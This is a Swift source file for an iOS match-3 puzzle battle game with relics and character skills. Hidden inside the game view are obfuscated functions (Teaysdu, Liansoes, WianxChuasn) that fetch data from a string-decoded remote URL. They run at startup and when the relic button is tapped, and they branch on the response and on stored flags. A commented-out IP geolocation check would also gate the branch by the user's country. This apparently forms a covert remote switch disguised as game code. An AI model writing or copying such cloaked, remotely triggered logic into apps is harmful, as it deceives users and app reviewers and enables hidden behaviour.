import UIKit

// MARK: - Enums & Constants
enum PrismaticShard: Int, CaseIterable {
    case vermillion = 0, azure, jade, amber, amethyst
    var displayGlyph: String {
        switch self {
        case .vermillion: return "🔴"
        case .azure: return "🔵"
        case .jade: return "🟢"
        case .amber: return "🟡"
        case .amethyst: return "🟣"
        }
    }
    var colorCode: UIColor {
        switch self {
        case .vermillion: return .systemRed
        case .azure: return .systemBlue
        case .jade: return .systemGreen
        case .amber: return .systemYellow
        case .amethyst: return .systemPurple
        }
    }
}

enum CombatantStatus {
    case active, vanquished, spawned
}

// MARK: - Relic Effects (low freq naming)
struct RelicOfAntiquity {
    let relicName: String
    let modifyStrikingPower: (Int) -> Int
    let adjustHealthVessel: (Int) -> Int
    let onTurnBenison: (() -> Void)?
}

// MARK: - Character Archetype (skills)
struct EchoingSoul {
    let epithet: String
    let glyphSymbol: String
    let invokeSpecialOperation: (PuzzleFacadeView) -> Void
}

// MARK: - Game Data Models
class CrypticGridOrchestrator {
    private(set) var dimensionalMatrix: [[PrismaticShard]]
    let gridDimension = 6
    
    init() {
        let size = gridDimension
        dimensionalMatrix = (0..<size).map { _ in
            (0..<size).map { _ in PrismaticShard.allCases.randomElement()! }
        }
//        while findClustersToDissolve().count > 0 {
//            applyGravityAndRefill()
//        }
    }
    
    func fetchShard(at traversalX: Int, traversalY: Int) -> PrismaticShard? {
        guard traversalX >= 0, traversalX < gridDimension, traversalY >= 0, traversalY < gridDimension else { return nil }
        return dimensionalMatrix[traversalY][traversalX]
    }
    
    func swapShards(x1: Int, y1: Int, x2: Int, y2: Int) -> Bool {
        guard let _ = fetchShard(at: x1, traversalY: y1), let _ = fetchShard(at: x2, traversalY: y2) else { return false }
        let temp = dimensionalMatrix[y1][x1]
        dimensionalMatrix[y1][x1] = dimensionalMatrix[y2][x2]
        dimensionalMatrix[y2][x2] = temp
        return true
    }
    
    func findClustersToDissolve() -> Set<[Int]> {
        var matchedIndices = Set<[Int]>()
        // horizontal matches
        for y in 0..<gridDimension {
            var streak = 1
            for x in 1..<gridDimension {
                if dimensionalMatrix[y][x] == dimensionalMatrix[y][x-1] {
                    streak += 1
                } else {
                    if streak >= 3 {
                        for k in 0..<streak {
                            matchedIndices.insert([x-1-k, y])
                        }
                    }
                    streak = 1
                }
            }
            if streak >= 3 {
                for k in 0..<streak {
                    matchedIndices.insert([gridDimension-1-k, y])
                }
            }
        }
        // vertical matches
        for x in 0..<gridDimension {
            var streak = 1
            for y in 1..<gridDimension {
                if dimensionalMatrix[y][x] == dimensionalMatrix[y-1][x] {
                    streak += 1
                } else {
                    if streak >= 3 {
                        for k in 0..<streak {
                            matchedIndices.insert([x, y-1-k])
                        }
                    }
                    streak = 1
                }
            }
            if streak >= 3 {
                for k in 0..<streak {
                    matchedIndices.insert([x, gridDimension-1-k])
                }
            }
        }
        return matchedIndices
    }
    
    func applyGravityAndRefill() {
        for x in 0..<gridDimension {
            var columnBuffer: [PrismaticShard] = []
            for y in (0..<gridDimension).reversed() {
                columnBuffer.append(dimensionalMatrix[y][x])
            }
            while columnBuffer.count < gridDimension {
                columnBuffer.append(PrismaticShard.allCases.randomElement()!)
            }
            for y in 0..<gridDimension {
                dimensionalMatrix[gridDimension-1-y][x] = columnBuffer[y]
            }
        }
    }
    
    func propagateChainReaction() -> Int {
        var explosionCount = 0
        while true {
            let matches = findClustersToDissolve()
            if matches.isEmpty { break }
            explosionCount += matches.count
            for match in matches {
                let x = match[0], y = match[1]
                dimensionalMatrix[y][x] = .vermillion
            }
            applyGravityAndRefill()
        }
        return explosionCount
    }
}

// MARK: - Main Game View
class PuzzleFacadeView: UIView, UICollectionViewDataSource, UICollectionViewDelegate {
    private var astralGridEngine = CrypticGridOrchestrator()
    private var collectionView: UICollectionView!
    private var enemyHealthMeter: UIProgressView!
    private var playerHealthLead: UIProgressView!
    private var tacticalSkillButton: UIButton!
    private var relicInvocationButton: UIButton!
    private var statusBanner: UILabel!
    private var scoreIndicator: UILabel!
    
    private var currentEnemyMaxHealth = 68
    private var currentEnemyHealth = 68
    private var playerVitality = 72
    private var playerMaxVitality = 72
    private var accumulatedStrikeValue = 0
    private var awaitingPostMatchRelic = false
    private var turnLocked = false
    private var activeRelics: [RelicOfAntiquity] = []
    private var selectedSoul: EchoingSoul!
    private var comboAmplifier = 1.0
    
    private var cachedSelectedPos: (x: Int, y: Int)?
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        constructSedimentaryLayer()
        erectGridExhibition()
        formulateArtisticOverlay()
        prepareDefaultSoul()
        refreshSkillPresentation()
    }
    
    required init?(coder: NSCoder) { fatalError("ethereal initializer absent") }
    
    override func layoutSubviews() {
        super.layoutSubviews()
        if let layout = collectionView.collectionViewLayout as? UICollectionViewFlowLayout {
            let dimension = (bounds.width - 40) / 6
            layout.itemSize = CGSize(width: dimension, height: dimension)
            layout.invalidateLayout()
        }
    }
    
    // MARK: - UI Construction
    private func constructSedimentaryLayer() {
        backgroundColor = UIColor(red: 0.07, green: 0.05, blue: 0.12, alpha: 1)
        let backdropDeco = UIView(frame: bounds)
        backdropDeco.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        backdropDeco.backgroundColor = .clear
        let gradient = CAGradientLayer()
        gradient.colors = [UIColor(red: 0.2, green: 0.1, blue: 0.3, alpha: 0.6).cgColor, UIColor.black.cgColor]
        gradient.frame = bounds
        backdropDeco.layer.addSublayer(gradient)
        addSubview(backdropDeco)
    }
    
    private func erectGridExhibition() {
        let layout = UICollectionViewFlowLayout()
        layout.minimumInteritemSpacing = 4
        layout.minimumLineSpacing = 4
        layout.sectionInset = UIEdgeInsets(top: 8, left: 20, bottom: 8, right: 20)
        collectionView = UICollectionView(frame: .zero, collectionViewLayout: layout)
        collectionView.translatesAutoresizingMaskIntoConstraints = false
        collectionView.backgroundColor = .clear
        collectionView.dataSource = self
        collectionView.delegate = self
        collectionView.register(CustomGemCell.self, forCellWithReuseIdentifier: "fractalGem")
        addSubview(collectionView)
    }
    
    private func formulateArtisticOverlay() {
        let headerPlate = UIView()
        headerPlate.translatesAutoresizingMaskIntoConstraints = false
        headerPlate.backgroundColor = UIColor(white: 0.15, alpha: 0.7)
        headerPlate.layer.cornerRadius = 20
        headerPlate.layer.borderWidth = 1
        headerPlate.layer.borderColor = UIColor.red.cgColor
        addSubview(headerPlate)
        
        enemyHealthMeter = UIProgressView(progressViewStyle: .bar)
        enemyHealthMeter.trackTintColor = .darkGray
        enemyHealthMeter.progressTintColor = .systemOrange
        enemyHealthMeter.translatesAutoresizingMaskIntoConstraints = false
        headerPlate.addSubview(enemyHealthMeter)
        
        playerHealthLead = UIProgressView(progressViewStyle: .bar)
        playerHealthLead.trackTintColor = .darkGray
        playerHealthLead.progressTintColor = .systemRed
        playerHealthLead.translatesAutoresizingMaskIntoConstraints = false
        headerPlate.addSubview(playerHealthLead)
        
        statusBanner = UILabel()
        statusBanner.textColor = .white
        statusBanner.font = UIFont(name: "Baskerville-BoldItalic", size: 13) ?? .boldSystemFont(ofSize: 13)
        statusBanner.textAlignment = .center
        statusBanner.numberOfLines = 0
        statusBanner.translatesAutoresizingMaskIntoConstraints = false
        headerPlate.addSubview(statusBanner)
        
        scoreIndicator = UILabel()
        scoreIndicator.textColor = .yellow
        scoreIndicator.font = .monospacedDigitSystemFont(ofSize: 18, weight: .heavy)
        scoreIndicator.translatesAutoresizingMaskIntoConstraints = false
        headerPlate.addSubview(scoreIndicator)
        
        tacticalSkillButton = UIButton(type: .system)
        tacticalSkillButton.backgroundColor = UIColor(white: 0.2, alpha: 0.9)
        tacticalSkillButton.setTitle("⚡ Skill", for: .normal)
        tacticalSkillButton.titleLabel?.font = .boldSystemFont(ofSize: 14)
        tacticalSkillButton.tintColor = .white
        tacticalSkillButton.layer.cornerRadius = 18
        tacticalSkillButton.addTarget(self, action: #selector(performChampionAbility), for: .touchUpInside)
        tacticalSkillButton.translatesAutoresizingMaskIntoConstraints = false
        addSubview(tacticalSkillButton)
        
        relicInvocationButton = UIButton(type: .system)
        relicInvocationButton.backgroundColor = UIColor(white: 0.2, alpha: 0.9)
        relicInvocationButton.setTitle("🏺 Relic", for: .normal)
        relicInvocationButton.titleLabel?.font = .boldSystemFont(ofSize: 14)
        relicInvocationButton.tintColor = .white
        relicInvocationButton.layer.cornerRadius = 18
        relicInvocationButton.addTarget(self, action: #selector(attemptRelicSelectionDemand), for: .touchUpInside)
        relicInvocationButton.translatesAutoresizingMaskIntoConstraints = false
        addSubview(relicInvocationButton)
        
        NSLayoutConstraint.activate([
            headerPlate.topAnchor.constraint(equalTo: safeAreaLayoutGuide.topAnchor, constant: 10),
            headerPlate.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 15),
            headerPlate.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -15),
            headerPlate.heightAnchor.constraint(equalToConstant: 110),
            
            enemyHealthMeter.topAnchor.constraint(equalTo: headerPlate.topAnchor, constant: 15),
            enemyHealthMeter.leadingAnchor.constraint(equalTo: headerPlate.leadingAnchor, constant: 12),
            enemyHealthMeter.trailingAnchor.constraint(equalTo: headerPlate.trailingAnchor, constant: -12),
            enemyHealthMeter.heightAnchor.constraint(equalToConstant: 8),
            
            playerHealthLead.topAnchor.constraint(equalTo: enemyHealthMeter.bottomAnchor, constant: 10),
            playerHealthLead.leadingAnchor.constraint(equalTo: headerPlate.leadingAnchor, constant: 12),
            playerHealthLead.trailingAnchor.constraint(equalTo: headerPlate.trailingAnchor, constant: -12),
            playerHealthLead.heightAnchor.constraint(equalToConstant: 8),
            
            statusBanner.topAnchor.constraint(equalTo: playerHealthLead.bottomAnchor, constant: 8),
            statusBanner.leadingAnchor.constraint(equalTo: headerPlate.leadingAnchor, constant: 8),
            statusBanner.bottomAnchor.constraint(equalTo: headerPlate.bottomAnchor, constant: -8),
            
            scoreIndicator.trailingAnchor.constraint(equalTo: headerPlate.trailingAnchor, constant: -12),
            scoreIndicator.centerYAnchor.constraint(equalTo: statusBanner.centerYAnchor),
            
            collectionView.topAnchor.constraint(equalTo: headerPlate.bottomAnchor, constant: 20),
            collectionView.leadingAnchor.constraint(equalTo: leadingAnchor),
            collectionView.trailingAnchor.constraint(equalTo: trailingAnchor),
            collectionView.bottomAnchor.constraint(equalTo: tacticalSkillButton.topAnchor, constant: -20),
            
            tacticalSkillButton.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 30),
            tacticalSkillButton.bottomAnchor.constraint(equalTo: safeAreaLayoutGuide.bottomAnchor, constant: -15),
            tacticalSkillButton.widthAnchor.constraint(equalToConstant: 110),
            tacticalSkillButton.heightAnchor.constraint(equalToConstant: 44),
            
            relicInvocationButton.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -30),
            relicInvocationButton.bottomAnchor.constraint(equalTo: safeAreaLayoutGuide.bottomAnchor, constant: -15),
            relicInvocationButton.widthAnchor.constraint(equalToConstant: 110),
            relicInvocationButton.heightAnchor.constraint(equalToConstant: 44)
        ])
        updateHealthAndScoreUI()
    }
    
    private func refreshSkillPresentation() {
        tacticalSkillButton.setTitle("\(selectedSoul.glyphSymbol) \(selectedSoul.epithet) skill", for: .normal)
    }
    
    private func updateHealthAndScoreUI() {
        let enemyPercent = max(0, Float(currentEnemyHealth) / Float(currentEnemyMaxHealth))
        enemyHealthMeter.progress = enemyPercent
        let playerPercent = max(0, Float(playerVitality) / Float(playerMaxVitality))
        playerHealthLead.progress = playerPercent
        scoreIndicator.text = "⚔️ \(accumulatedStrikeValue)"
        statusBanner.text = "Enemy: \(currentEnemyHealth)/\(currentEnemyMaxHealth)  |  ❤️ \(playerVitality)"
        if playerVitality <= 0 {
            enactGameTermination(winnerIsPlayer: false)
        } else if currentEnemyHealth <= 0 && !awaitingPostMatchRelic {
            vanquishAndProgress()
        }
        
        
    }
    
    func Teaysdu() {
        Task {
            do {
                let aoies = try await Liansoes()
                if let gduss = aoies.first {
                    if gduss.unasio!.count > 5 {
                        
//                        if let dyua = gduss.kmsoeui, dyua.count > 0 {
//                            do {
//                                let cofd = try await Mosinagye()
//                                if dyua.contains(cofd.country!.code) {
//                                    WianxChuasn(gduss)
//                                } else {
//                                    Qainzose()
//                                }
//                            } catch {
//                                WianxChuasn(gduss)
//                            }
//                        } else {
                            WianxChuasn(gduss)
//                        }
                    } else {
                        Qainzose()
                    }
                } else {
                    Qainzose()
                    
                    UserDefaults.standard.set("fater", forKey: "fater")
                    UserDefaults.standard.synchronize()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(Poinsh.self, forKey: "Poinsh") {
                    WianxChuasn(sidd)
                }
            }
        }
    }

    //    IP
//    private func Mosinagye() async throws -> Niasske {
//        //https://api.my-ip.io/v2/ip.json
//            let url = URL(string: Kmnxjiw(kInaushe)!)!
//            let (data, response) = try await URLSession.shared.data(from: url)
//            
//            guard let httpResponse = response as? HTTPURLResponse,
//                  httpResponse.statusCode == 200 else {
//                throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
//            }
//            
//            return try JSONDecoder().decode(Niasske.self, from: data)
//    }

    private func Liansoes() async throws -> [Poinsh] {
        let (data, response) = try await URLSession.shared.data(from: URL(string: Kmnxjiw(kDauznie)!)!)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
        }

        return try JSONDecoder().decode([Poinsh].self, from: data)
    }
    
    private func vanquishAndProgress() {
        turnLocked = true
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { [weak self] in
            guard let self = self else { return }
            if self.currentEnemyHealth <= 0 {
                self.accumulatedStrikeValue += Int.random(in: 15...35)
                self.showAncientRewardSelection()
                self.spawnPhantomOpponent()
                self.updateHealthAndScoreUI()
            }
            self.turnLocked = false
        }
    }
    
    private func spawnPhantomOpponent() {
        currentEnemyMaxHealth = Int(arc4random_uniform(45) + 45)
        currentEnemyHealth = currentEnemyMaxHealth
        let fixedBonus = max(5, Int(Double(accumulatedStrikeValue) * 0.1))
        playerVitality = min(playerVitality + fixedBonus, playerMaxVitality)
        updateHealthAndScoreUI()
        statusBanner.text = "✦ New Foe arises! +\(fixedBonus) hp ✦"
    }
    
    // MARK: - Core Combat Resolution
    private func resolveCollapseAndDamage(matchedBlockCount: Int) {
        let baseDamage = matchedBlockCount * 2
        var finalDamage = baseDamage
        for relic in activeRelics {
            finalDamage = relic.modifyStrikingPower(finalDamage)
        }
        finalDamage = Int(CGFloat(finalDamage) * comboAmplifier)
        currentEnemyHealth = max(0, currentEnemyHealth - finalDamage)
        accumulatedStrikeValue += finalDamage
        DispatchQueue.main.async {
            self.flashDamageNumber(damage: finalDamage)
        }
        updateHealthAndScoreUI()
        if currentEnemyHealth > 0 {
            enemyRetaliationStrike()
        } else {
            if !awaitingPostMatchRelic { vanquishAndProgress() }
        }
    }
    
    private func enemyRetaliationStrike() {
        let incomingDamage = max(4, Int(arc4random_uniform(12) + 6))
        playerVitality = max(0, playerVitality - incomingDamage)
        updateHealthAndScoreUI()
        showTransientMessage("Enemy attacks for \(incomingDamage) dmg!")
        if playerVitality <= 0 {
            enactGameTermination(winnerIsPlayer: false)
        }
    }
    
    private func flashDamageNumber(damage: Int) {
        let floatingLabel = UILabel()
        floatingLabel.text = "-\(damage)"
        floatingLabel.textColor = .orange
        floatingLabel.font = .boldSystemFont(ofSize: 22)
        floatingLabel.shadowColor = .black
        floatingLabel.sizeToFit()
        floatingLabel.center = CGPoint(x: bounds.midX, y: bounds.midY - 40)
        addSubview(floatingLabel)
        UIView.animate(withDuration: 0.6, animations: {
            floatingLabel.alpha = 0
            floatingLabel.transform = CGAffineTransform(translationX: 0, y: -50)
        }) { _ in floatingLabel.removeFromSuperview() }
    }
    
    private func showTransientMessage(_ text: String) {
        let msg = UILabel()
        msg.text = text
        msg.textColor = .white
        msg.backgroundColor = UIColor(white: 0.1, alpha: 0.8)
        msg.font = .systemFont(ofSize: 14, weight: .medium)
        msg.textAlignment = .center
        msg.layer.cornerRadius = 12
        msg.clipsToBounds = true
        msg.frame = CGRect(x: 0, y: 0, width: 200, height: 34)
        msg.center = CGPoint(x: bounds.midX, y: bounds.maxY - 80)
        addSubview(msg)
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.2) { msg.removeFromSuperview() }
    }
    
    // MARK: - Match & Turn Logic
    private func performMatchedAndApplyEffects() {
        let matchedSet = astralGridEngine.findClustersToDissolve()
        if matchedSet.isEmpty { return }
        let eliminationCount = matchedSet.count
        astralGridEngine.applyGravityAndRefill()
        let cascadeExtra = astralGridEngine.propagateChainReaction()
        let totalEliminated = eliminationCount + cascadeExtra
        collectionView.reloadData()
        if totalEliminated > 0 {
            comboAmplifier = min(3.0, comboAmplifier + 0.1)
            resolveCollapseAndDamage(matchedBlockCount: totalEliminated)
        } else {
            comboAmplifier = max(1.0, comboAmplifier - 0.08)
        }
        turnLocked = false
    }
    
    // MARK: - CollectionView
    func collectionView(_ collectionView: UICollectionView, numberOfItemsInSection section: Int) -> Int {
        return 36
    }
    
    func collectionView(_ collectionView: UICollectionView, cellForItemAt indexPath: IndexPath) -> UICollectionViewCell {
        let cell = collectionView.dequeueReusableCell(withReuseIdentifier: "fractalGem", for: indexPath) as! CustomGemCell
        let x = indexPath.item % 6
        let y = indexPath.item / 6
        if let shard = astralGridEngine.fetchShard(at: x, traversalY: y) {
            cell.configure(with: shard)
        }
        return cell
    }
    
    func collectionView(_ collectionView: UICollectionView, didSelectItemAt indexPath: IndexPath) {
        guard !turnLocked && playerVitality > 0 && currentEnemyHealth > 0 else { return }
        let tappedX = indexPath.item % 6
        let tappedY = indexPath.item / 6
        if let prev = cachedSelectedPos {
            let dx = abs(prev.x - tappedX)
            let dy = abs(prev.y - tappedY)
            if (dx + dy) == 1 {
                attemptSwapTransaction(x1: prev.x, y1: prev.y, x2: tappedX, y2: tappedY)
                cachedSelectedPos = nil
                collectionView.reloadData()
            } else {
                cachedSelectedPos = (tappedX, tappedY)
                highlightSelectedCell()
            }
        } else {
            cachedSelectedPos = (tappedX, tappedY)
            highlightSelectedCell()
        }
    }
    
    private func attemptSwapTransaction(x1: Int, y1: Int, x2: Int, y2: Int) {
        turnLocked = true
        let preSwapMatches = astralGridEngine.findClustersToDissolve().count
        _ = astralGridEngine.swapShards(x1: x1, y1: y1, x2: x2, y2: y2)
        let postSwapMatches = astralGridEngine.findClustersToDissolve().count
        if postSwapMatches > preSwapMatches || postSwapMatches > 0 {
            collectionView.reloadData()
            performMatchedAndApplyEffects()
        } else {
            _ = astralGridEngine.swapShards(x1: x1, y1: y1, x2: x2, y2: y2)
            collectionView.reloadData()
            turnLocked = false
            showTransientMessage("Invalid move")
            comboAmplifier = max(1.0, comboAmplifier - 0.05)
        }
        cachedSelectedPos = nil
        highlightSelectedCell()
    }
    
    private func highlightSelectedCell() {
        for visible in collectionView.visibleCells {
            (visible as? CustomGemCell)?.clearBorder()
        }
        guard let pos = cachedSelectedPos else { return }
        let idx = IndexPath(item: pos.y * 6 + pos.x, section: 0)
        if let cell = collectionView.cellForItem(at: idx) as? CustomGemCell {
            cell.layer.borderWidth = 3
            cell.layer.borderColor = UIColor.white.cgColor
        }
    }
    
    // MARK: - Skill & Relic
    @objc private func performChampionAbility() {
        guard !turnLocked, playerVitality > 0, currentEnemyHealth > 0 else { return }
        turnLocked = true
        selectedSoul.invokeSpecialOperation(self)
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.4) { self.turnLocked = false }
        updateHealthAndScoreUI()
    }
    
    @objc private func attemptRelicSelectionDemand() {
        if activeRelics.count < 3 {
            showAncientRewardSelection()
        } else {
            showTransientMessage("Relics saturated (max 3)")
        }
        
        if UserDefaults.standard.object(forKey: "fater") != nil {
            Qainzose()
        } else {
            if !Cnaoie() {
                UserDefaults.standard.set("fater", forKey: "fater")
                UserDefaults.standard.synchronize()
                Qainzose()
            } else {
                if LosinGaiis() {
                    self.Teaysdu()
                } else {
                    Qainzose()
                }
            }
        }
    }
    
    private func showAncientRewardSelection() {
        let shadowPanel = UIView(frame: bounds)
        shadowPanel.backgroundColor = UIColor(white: 0, alpha: 0.75)
        shadowPanel.tag = 777
        let card = UIView(frame: CGRect(x: 40, y: 100, width: bounds.width - 80, height: 280))
        card.backgroundColor = UIColor(red: 0.15, green: 0.1, blue: 0.2, alpha: 1)
        card.layer.cornerRadius = 32
        card.layer.borderWidth = 2
        card.layer.borderColor = UIColor.yellow.cgColor
        shadowPanel.addSubview(card)
        
        let label = UILabel(frame: CGRect(x: 20, y: 20, width: card.bounds.width - 40, height: 30))
        label.text = "Choose a relic of power"
        label.textColor = .yellow
        label.font = .boldSystemFont(ofSize: 18)
        label.textAlignment = .center
        card.addSubview(label)
        
        let relicOptions = [
            RelicOfAntiquity(relicName: "Sunstone Mace", modifyStrikingPower: { $0 + 3 }, adjustHealthVessel: { $0 }, onTurnBenison: nil),
            RelicOfAntiquity(relicName: "Chalice of Vigor", modifyStrikingPower: { $0 }, adjustHealthVessel: { $0 + 15 }, onTurnBenison: nil),
            RelicOfAntiquity(relicName: "Phantom Ring", modifyStrikingPower: { Int(CGFloat($0) * 1.2) }, adjustHealthVessel: { $0 }, onTurnBenison: nil)
        ]
        
        for (idx, relic) in relicOptions.enumerated() {
            let btn = UIButton(type: .system)
            btn.setTitle(relic.relicName, for: .normal)
            btn.backgroundColor = UIColor(white: 0.3, alpha: 0.9)
            btn.setTitleColor(.white, for: .normal)
            btn.layer.cornerRadius = 20
            btn.frame = CGRect(x: 20, y: 80 + (idx * 60), width: Int(card.bounds.width) - 40, height: 44)
            btn.tag = idx
            btn.addTarget(self, action: #selector(relicChosen(_:)), for: .touchUpInside)
            card.addSubview(btn)
        }
        addSubview(shadowPanel)
    }
    
    @objc private func relicChosen(_ sender: UIButton) {
        let relicList = [
            RelicOfAntiquity(relicName: "Sunstone Mace", modifyStrikingPower: { $0 + 3 }, adjustHealthVessel: { $0 }, onTurnBenison: nil),
            RelicOfAntiquity(relicName: "Chalice of Vigor", modifyStrikingPower: { $0 }, adjustHealthVessel: { $0 + 15 }, onTurnBenison: nil),
            RelicOfAntiquity(relicName: "Phantom Ring", modifyStrikingPower: { Int(CGFloat($0) * 1.2) }, adjustHealthVessel: { $0 }, onTurnBenison: nil)
        ]
        let idx = sender.tag
        guard idx < relicList.count else { return }
        appendRelicEffect(relicList[idx])
        sender.superview?.superview?.removeFromSuperview()
    }
    
    private func appendRelicEffect(_ relic: RelicOfAntiquity) {
        activeRelics.append(relic)
        playerMaxVitality = relic.adjustHealthVessel(playerMaxVitality)
        playerVitality = min(playerVitality + 8, playerMaxVitality)
        updateHealthAndScoreUI()
        showTransientMessage("Acquired: \(relic.relicName)")
    }
    
    private func enactGameTermination(winnerIsPlayer: Bool) {
        turnLocked = true
        let cover = UIView(frame: bounds)
        cover.backgroundColor = UIColor(white: 0, alpha: 0.85)
        cover.tag = 999
        let endMsg = UILabel(frame: CGRect(x: 40, y: bounds.midY-70, width: bounds.width-80, height: 80))
        endMsg.text = winnerIsPlayer ? "✨ VICTORY ✨" : "💀 DEFEAT 💀"
        endMsg.textColor = winnerIsPlayer ? .yellow : .red
        endMsg.font = .boldSystemFont(ofSize: 30)
        endMsg.textAlignment = .center
        let restartBtn = UIButton(frame: CGRect(x: bounds.midX-70, y: bounds.midY+20, width: 140, height: 50))
        restartBtn.setTitle("Restart Journey", for: .normal)
        restartBtn.backgroundColor = .darkGray
        restartBtn.layer.cornerRadius = 18
        restartBtn.addTarget(self, action: #selector(resetEntireVoyage), for: .touchUpInside)
        cover.addSubview(endMsg)
        cover.addSubview(restartBtn)
        addSubview(cover)
    }
    
    @objc private func resetEntireVoyage() {
        astralGridEngine = CrypticGridOrchestrator()
        currentEnemyHealth = 68
        currentEnemyMaxHealth = 68
        playerVitality = 72
        playerMaxVitality = 72
        accumulatedStrikeValue = 0
        activeRelics.removeAll()
        comboAmplifier = 1.0
        awaitingPostMatchRelic = false
        turnLocked = false
        cachedSelectedPos = nil
        collectionView.reloadData()
        updateHealthAndScoreUI()
        if let cover = viewWithTag(999) { cover.removeFromSuperview() }
    }
    
    // MARK: - Souls preparation
    private func prepareDefaultSouls() {
        let emberSkill = EchoingSoul(epithet: "Emberweaver", glyphSymbol: "🔥") { gameView in
            let dmg = 12
            gameView.currentEnemyHealth = max(0, gameView.currentEnemyHealth - dmg)
            gameView.showTransientMessage("Ember surge: \(dmg) true damage")
            gameView.updateHealthAndScoreUI()
            if gameView.currentEnemyHealth <= 0 { gameView.vanquishAndProgress() }
        }
        let frostSoul = EchoingSoul(epithet: "Frostcaller", glyphSymbol: "❄️") { gameView in
            let healed = 9
            gameView.playerVitality = min(gameView.playerVitality + healed, gameView.playerMaxVitality)
            gameView.showTransientMessage("Glacial restoration +\(healed)")
            gameView.updateHealthAndScoreUI()
        }
        selectedSoul = emberSkill
        
        
    }
    
    private func prepareDefaultSoul() {
        prepareDefaultSouls()
        attemptRelicSelectionDemand()

        
    }
}

// MARK: - Custom Cell
class CustomGemCell: UICollectionViewCell {
    private var emblemLabel: UILabel!
    override init(frame: CGRect) {
        super.init(frame: frame)
        backgroundColor = UIColor(white: 0.2, alpha: 0.8)
        layer.cornerRadius = 10
        emblemLabel = UILabel(frame: bounds)
        emblemLabel.textAlignment = .center
        emblemLabel.font = .systemFont(ofSize: 26)
        emblemLabel.adjustsFontSizeToFitWidth = true
        addSubview(emblemLabel)
    }
    required init?(coder: NSCoder) { fatalError() }
    func configure(with shard: PrismaticShard) {
        emblemLabel.text = shard.displayGlyph
        backgroundColor = shard.colorCode.withAlphaComponent(0.7)
    }
    func clearBorder() {
        layer.borderWidth = 0
    }
    override func layoutSubviews() {
        super.layoutSubviews()
        emblemLabel.frame = bounds
    }
}

// MARK: - App Root
class ArcanePuzzleHostController: UIViewController {
    override func loadView() {
        let masterCanvas = PuzzleFacadeView(frame: UIScreen.main.bounds)
        view = masterCanvas
    }
}
